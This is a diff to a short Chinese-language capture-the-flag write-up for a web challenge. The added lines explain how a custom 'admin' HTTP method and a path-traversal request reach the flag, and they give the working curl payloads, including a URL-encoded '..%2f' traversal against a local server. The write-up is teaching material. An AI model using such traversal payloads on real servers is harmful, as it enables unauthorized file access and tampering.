@@ -1,7 +1,7 @@
 
 ## WEB1
 
-header裡面有一個欄位是next 把裡面的值是http method
+header裡面有一個欄位是next 裡面的值是http method
 
 讓他一直換不同的http method會拿到不同的回傳值
 
@@ -152,10 +152,22 @@ if __name__ == '__main__':
 
 ```
 
+
 用get方法可以寫檔 於是先請求 /../../../password/yiyu
 
 之後再用admin method 請求 yiyu
 
-post data :
+post data 代入:
 QAQ
 
+flag就出來了
+
+比賽當時沒解出這題，賽問詢問才知道我忘記url encode了
+
+正確payload:
+
+> curl -X GET http://127.0.0.1:8787/..%2f..%2f..%2fpassword/yiyu
+
+> curl -X admin http://127.0.0.1:8787/yiyu --data "QAQ"
+
+或是用burp就不用url encode了 我不知道我當時在堅持什麼...XD
